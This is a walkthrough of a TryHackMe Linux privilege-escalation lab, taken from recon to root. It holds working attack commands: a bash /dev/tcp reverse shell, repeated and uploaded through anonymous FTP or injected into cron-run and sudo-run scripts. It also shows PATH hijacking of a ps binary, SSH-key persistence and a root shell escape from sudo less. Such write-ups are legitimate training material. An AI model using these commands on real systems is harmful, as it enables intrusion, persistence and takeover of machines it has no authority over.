# Jump! Linux PrivEsc Challenge

This is a Linux *Privilege Escalation* challenge from the *Privilege Escalation* Module on the *Jr. Penetration Tester* from TryHackMe! 

> If you're struggling with the monitor flag and you are here for it, before you move on, check the healthcheck service. It's a little glitchy and sometimes it just don't want to start. I don't know why but reboot the machine until it works.

`systemctl status healthcheck.service`

> Or just dirtyfrag the sh\*t out of the lab :)

---

## Recon Flag

As the challenge didn't provide any information about the target or ssh user to connect to the first user, I decided to use nmap to find services. 

```shell
# nmap <REMOTE_HOST>

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

FTP is open and has `anonymous` login active (blank password works), so we can see a little inside the server. It turns out the server runs scripts from the `incoming/` directory without checking it first (rookie mistake). We'll generate a reverse shell bash script and upload it into the FTP server (`put revshell.sh`).

The README.txt file inside the pub directory gives us info:

```
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

The `revshell.sh` script:

```shell
#!/bin/bash
bash -i >& /dev/tcp/<LOCAL_HOST>/<PORT> 0>&1
```

Run the listener:

```shell
nc -lvnp <PORT>
```

If you still can't get a reverse shell, try:
- Wait a little, it is a cron job.
- Be sure you're uploading it to `incoming/`, not `pub/incoming`

You'll be logged in as recon_user, just cat the flag and move on to the next one!

PS. The shell is very unstable. You can go with a socat, backdoor, meterpreter session, but I just created a new ssh key and copied it to my local host via scp.

## Dev Flag

So... recon_user is part of the dev group. You can just get the flag :D

`id`:
```
1002(dev_user),1005(devops)
```

But you still need access to `dev_user` access to pwn the `monitor_user`. So with `pspy64` it's possible to see a backup process being called by the dev user. You just need to add the same `bash -i` revshell to the `/opt/dev/backup.sh` file with a different port, listen on this port and wait. You'll get the shell as dev_user and I recommend, again, generating an SSH key for persistence.

`pspy64`:
```
2026/06/02 19:15:46 CMD: UID=1002  PID=1372   | /bin/bash /opt/dev/backup.sh
```

## Monitor Flag

I got a bit mad at this one. Not because it was hard, but because I wasted too much time due to lab glitches. During log enumeration, I found something interesting inside the `monitor.log` file.

`/var/log/monitor.log`
```
monitor+   40783  0.0  0.0   2800  1664 ?        Ss   09:02   0:00 /bin/sh -c PATH=/home/dev_user/bin:/usr/local/bin:/usr/bin /usr/local/bin/healthcheck >> /var/log/monitor.log 2>&1
```

The monitor user is using a custom PATH and was supposed to be running healthcheck every minute. The log file shows `/home/dev_user/bin` in the PATH, but that's misleading. The actual PATH used by the monitor user is `/opt/dev/bin`. The lab seems to be misconfigured. Inside this directory, you'll find a `ps` binary that you need to replace to get a reverse shell. Since healthcheck calls `ps` and `/opt/dev/bin` is the first directory in the monitor user's PATH, you can replace it with a reverse shell script to hijack execution.

`cat /etc/systemd/system/healthcheck.timer`:
```
[Unit]
Description=Run healthcheck every minute

[Timer]
OnBootSec=30
OnUnitActiveSec=60
Persistent=true

[Install]
WantedBy=timers.target
```

But due to the lab glitch, you may need to reboot the machine until the timer actually fires.

`/usr/local/healthcheck`:
```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

`/home/dev_user/bin/whoami`:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<LOCAL_HOST>/<PORT> 0>&1
```

Give execution permissions to everyone. I was pissed so I just gave full access:

```shell
chmod -R 777 /opt/dev/bin
```

Then, if the healthcheck job is running, just open a listener and wait.

## Ops Flag

When you login with the monitor_user, generate an ssh key and set up persistence. You will need it to escalate to ops_user.

```shell
# make dir
mkdir /home/monitor_user/.ssh

# gen
ssh-keygen -f /home/monitor_user/.ssh/monitor_user

# copy to authorized_keys and change perms
cat /home/monitor_user/.ssh/monitor_user.pub >> /home/monitor_user/.ssh/authorized_keys
chmod 700 /home/monitor_user/.ssh
chmod 600 /home/monitor_user/.ssh/authorized_keys

# copy the priv key to your local host
cat /home/monitor_user/.ssh/monitor_user

-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----

# change local permissions too
chmod 600 monitor_user

# connect
ssh -i monitor_user monitor_user@target
```

Now, if we run `sudo -l` to see the user's privileges, we will get this

```shell
# sudo -l
User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

It means we can run that binary as `ops_user` without a password, let's see what's inside the shell script.

`/usr/local/bin/deploy.sh`:
```shell
cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

We own the `deploy_helper.sh` script! We just need to set a reverse shell bash command inside it and run the `deploy.sh` as `ops_user`

`/opt/app/deploy_helper.sh`:
```shell
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
# insert reverse shell
bash -i >& /dev/tcp/<LOCAL_HOST>/<PORT> 0>&1
```

and run it.

```shell
# don't forget to set a listener
nc -lvnp <PORT>

# run as ops_user
sudo -u ops_user /usr/local/bin/deploy.sh
```

You could create a script to make and copy a ssh-key to the ops_user. I always choose a reverse shell because I love its simplicity. If it is a Pentest, maybe the server has some kind of outbound rules that block us to do that. Or maybe we don't have a VPS to to receive the callback. Anyway, I always go with a reverse shell.

## Root

Connected as `ops_user`, the `sudo -l` tells us that we have root privileges for the `less` command. You can check it in GTFOBins but this one is easy. Just use sudo to less any file you want and at the end of the file type `!/bin/bash` to open a shell (yes, just type it, trust me). The `!` will execute a command inside `less`, that's being run as root. Therefore, you will be spawning a `bash` shell as root.

```shell
# could be any file
sudo less /etc/passwd

!/bin/bash
```

Just one more thing: If you are doing this kind of PrivEsc in a real engagement, I STRONGLY suggest you to clean up the environment as you go. If it's not possible, remember to make a task to clean up later, but don't forget this step. Your clients will thank you.
